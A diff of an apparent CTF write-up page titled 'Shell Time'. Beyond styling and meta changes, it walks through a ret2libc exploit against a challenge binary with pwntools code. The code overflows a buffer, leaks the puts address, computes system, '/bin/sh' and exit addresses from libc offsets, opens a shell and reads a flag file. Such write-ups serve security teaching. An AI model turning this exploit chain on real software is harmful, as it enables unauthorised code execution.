@@ -11,9 +11,80 @@
       span.underline{text-decoration: underline;}
       div.column{display: inline-block; vertical-align: top; width: 50%;}
   </style>
+  <style>
+pre > code.sourceCode { white-space: pre; position: relative; }
+pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
+pre > code.sourceCode > span:empty { height: 1.2em; }
+code.sourceCode > span { color: inherit; text-decoration: inherit; }
+div.sourceCode { margin: 1em 0; }
+pre.sourceCode { margin: 0; }
+@media screen {
+div.sourceCode { overflow: auto; }
+}
+@media print {
+pre > code.sourceCode { white-space: pre-wrap; }
+pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
+}
+pre.numberSource code
+  { counter-reset: source-line 0; }
+pre.numberSource code > span
+  { position: relative; left: -4em; counter-increment: source-line; }
+pre.numberSource code > span > a:first-child::before
+  { content: counter(source-line);
+    position: relative; left: -1em; text-align: right; vertical-align: baseline;
+    border: none; display: inline-block;
+    -webkit-touch-callout: none; -webkit-user-select: none;
+    -khtml-user-select: none; -moz-user-select: none;
+    -ms-user-select: none; user-select: none;
+    padding: 0 4px; width: 4em;
+    background-color: #232629;
+    color: #7a7c7d;
+  }
+pre.numberSource { margin-left: 3em; border-left: 1px solid #7a7c7d;  padding-left: 4px; }
+div.sourceCode
+  { color: #cfcfc2; background-color: #232629; }
+@media screen {
+pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+}
+code span. { color: #cfcfc2; } /* Normal */
+code span.al { color: #95da4c; background-color: #4d1f24; font-weight: bold; } /* Alert */
+code span.an { color: #3f8058; } /* Annotation */
+code span.at { color: #2980b9; } /* Attribute */
+code span.bn { color: #f67400; } /* BaseN */
+code span.bu { color: #7f8c8d; } /* BuiltIn */
+code span.cf { color: #fdbc4b; font-weight: bold; } /* ControlFlow */
+code span.ch { color: #3daee9; } /* Char */
+code span.cn { color: #27aeae; font-weight: bold; } /* Constant */
+code span.co { color: #7a7c7d; } /* Comment */
+code span.cv { color: #7f8c8d; } /* CommentVar */
+code span.do { color: #a43340; } /* Documentation */
+code span.dt { color: #2980b9; } /* DataType */
+code span.dv { color: #f67400; } /* DecVal */
+code span.er { color: #da4453; text-decoration: underline; } /* Error */
+code span.ex { color: #0099ff; font-weight: bold; } /* Extension */
+code span.fl { color: #f67400; } /* Float */
+code span.fu { color: #8e44ad; } /* Function */
+code span.im { color: #27ae60; } /* Import */
+code span.in { color: #c45b00; } /* Information */
+code span.kw { color: #cfcfc2; font-weight: bold; } /* Keyword */
+code span.op { color: #cfcfc2; } /* Operator */
+code span.ot { color: #27ae60; } /* Other */
+code span.pp { color: #27ae60; } /* Preprocessor */
+code span.re { color: #2980b9; background-color: #153042; } /* RegionMarker */
+code span.sc { color: #3daee9; } /* SpecialChar */
+code span.ss { color: #da4453; } /* SpecialString */
+code span.st { color: #f44f4f; } /* String */
+code span.va { color: #27aeae; } /* Variable */
+code span.vs { color: #da4453; } /* VerbatimString */
+code span.wa { color: #da4453; } /* Warning */
+  </style>
   <!--[if lt IE 9]>
     <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
   <![endif]-->
+      <meta charset="UTF-8">
+      <meta name=”robots” content="index, follow">
+      <meta name="description" content="CTF Writeups, hacking techniques, reverse engineering & binary exploit, etc.">
+      <title>Onealmond</title>
       <link rel="stylesheet" type="text/css" href="../../css/global.css"></link>
       <script type="text/javascript" src="../../js/common.js"></script>
 </head>
@@ -24,33 +95,33 @@
 <h1 class="title">Shell Time</h1>
 </header>
 <p>The <em>Easy</em> level challenge of this program allows us to call <code>win</code> function to get the first flag. At this level requires us to get the second flag <code>/flag2.txt</code> via shell. The stack is non executable, we can’t just throw some shellcode to it, we need to try <code>ret2libc</code> method. To call<code>system("bin/sh")</code>, we need address of <code>system</code>, address of the <code>binsh</code> string and a return address for <code>system</code>. To find out the actuall address of some function in libc we can use a relative address of the function we want to another function we can easily find out the address. In this case, we call <code>puts@plt</code> to print the actual address of it at runtime which is stored in table <code>got</code>. We need to return send another payload to call <code>system</code>, so we need to return to a function that allow us to go through the whole process again, the payload would be <code>address of puts@plt + address of main + address of put@got</code>.</p>
-<pre><code>puts_plt = elf.plt[&#39;puts&#39;]
-puts_got = elf.got[&#39;puts&#39;]
-payload = b&#39;\x90&#39;*60
-payload += pwn.p32(puts_plt)
-payload += pwn.p32(elf.sym[&quot;main&quot;])
-payload += pwn.p32(puts_got)
-
-pr.sendlineafter(&quot;Input some text: &quot;, payload)
-pr.readuntil(&#39;Return address: &#39;)
-pr.readline()
-pr.readline()
-puts_addr = int.from_bytes(pr.read(4).strip().ljust(4, b&#39;\x00&#39;), &#39;little&#39;)
-print(&#39;puts&#39;, hex(puts_addr))</code></pre>
+<div class="sourceCode" id="cb1"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb1-1"><a href="#cb1-1"></a>puts_plt <span class="op">=</span> elf.plt[<span class="st">&#39;puts&#39;</span>]</span>
+<span id="cb1-2"><a href="#cb1-2"></a>puts_got <span class="op">=</span> elf.got[<span class="st">&#39;puts&#39;</span>]</span>
+<span id="cb1-3"><a href="#cb1-3"></a>payload <span class="op">=</span> b<span class="st">&#39;</span><span class="ch">\x90</span><span class="st">&#39;</span><span class="op">*</span><span class="dv">60</span></span>
+<span id="cb1-4"><a href="#cb1-4"></a>payload <span class="op">+=</span> pwn.p32(puts_plt)</span>
+<span id="cb1-5"><a href="#cb1-5"></a>payload <span class="op">+=</span> pwn.p32(elf.sym[<span class="st">&quot;main&quot;</span>])</span>
+<span id="cb1-6"><a href="#cb1-6"></a>payload <span class="op">+=</span> pwn.p32(puts_got)</span>
+<span id="cb1-7"><a href="#cb1-7"></a></span>
+<span id="cb1-8"><a href="#cb1-8"></a>pr.sendlineafter(<span class="st">&quot;Input some text: &quot;</span>, payload)</span>
+<span id="cb1-9"><a href="#cb1-9"></a>pr.readuntil(<span class="st">&#39;Return address: &#39;</span>)</span>
+<span id="cb1-10"><a href="#cb1-10"></a>pr.readline()</span>
+<span id="cb1-11"><a href="#cb1-11"></a>pr.readline()</span>
+<span id="cb1-12"><a href="#cb1-12"></a>puts_addr <span class="op">=</span> <span class="bu">int</span>.from_bytes(pr.read(<span class="dv">4</span>).strip().ljust(<span class="dv">4</span>, b<span class="st">&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>), <span class="st">&#39;little&#39;</span>)</span>
+<span id="cb1-13"><a href="#cb1-13"></a><span class="bu">print</span>(<span class="st">&#39;puts&#39;</span>, <span class="bu">hex</span>(puts_addr))</span></code></pre></div>
 <p>When we have the address of <code>puts</code>, we can find the relative address of system and binsh string via <a href="https://libc.blukat.me/?q=puts%3A0xf7d98b40&amp;l=libc6_2.27-3ubuntu1_i386">libc.blukat.me</a>, as we what it exit when <code>system</code> call returns, we also need to find out address of <code>exit</code>.</p>
-<pre><code>sys_addr = puts_addr - 0x2a940
-binsh_addr = puts_addr + 0x11658f
-exit_addr = puts_addr - 227184
-print(&#39;sys&#39;, hex(sys_addr))
-print(&#39;binsh&#39;, hex(binsh_addr))
-payload = b&#39;\x90&#39;*60
-payload += pwn.p32(sys_addr)
-payload += pwn.p32(exit_addr)
-payload += pwn.p32(binsh_addr)
-
-pr.sendlineafter(&quot;Input some text: &quot;, payload)
-pr.sendline(&quot;cat /flag2.txt&quot;)
-print(pr.readall(2).decode())</code></pre>
+<div class="sourceCode" id="cb2"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb2-1"><a href="#cb2-1"></a>sys_addr <span class="op">=</span> puts_addr <span class="op">-</span> <span class="bn">0x2a940</span></span>
+<span id="cb2-2"><a href="#cb2-2"></a>binsh_addr <span class="op">=</span> puts_addr <span class="op">+</span> <span class="bn">0x11658f</span></span>
+<span id="cb2-3"><a href="#cb2-3"></a>exit_addr <span class="op">=</span> puts_addr <span class="op">-</span> <span class="dv">227184</span></span>
+<span id="cb2-4"><a href="#cb2-4"></a><span class="bu">print</span>(<span class="st">&#39;sys&#39;</span>, <span class="bu">hex</span>(sys_addr))</span>
+<span id="cb2-5"><a href="#cb2-5"></a><span class="bu">print</span>(<span class="st">&#39;binsh&#39;</span>, <span class="bu">hex</span>(binsh_addr))</span>
+<span id="cb2-6"><a href="#cb2-6"></a>payload <span class="op">=</span> b<span class="st">&#39;</span><span class="ch">\x90</span><span class="st">&#39;</span><span class="op">*</span><span class="dv">60</span></span>
+<span id="cb2-7"><a href="#cb2-7"></a>payload <span class="op">+=</span> pwn.p32(sys_addr)</span>
+<span id="cb2-8"><a href="#cb2-8"></a>payload <span class="op">+=</span> pwn.p32(exit_addr)</span>
+<span id="cb2-9"><a href="#cb2-9"></a>payload <span class="op">+=</span> pwn.p32(binsh_addr)</span>
+<span id="cb2-10"><a href="#cb2-10"></a></span>
+<span id="cb2-11"><a href="#cb2-11"></a>pr.sendlineafter(<span class="st">&quot;Input some text: &quot;</span>, payload)</span>
+<span id="cb2-12"><a href="#cb2-12"></a>pr.sendline(<span class="st">&quot;cat /flag2.txt&quot;</span>)</span>
+<span id="cb2-13"><a href="#cb2-13"></a><span class="bu">print</span>(pr.readall(<span class="dv">2</span>).decode())</span></code></pre></div>
 <p>When we get a shell, <code>cat</code> command brings us the flag.</p>
     </div>
     <a id="back-to-top" class="back-to-top" href="#header">TOP</a>
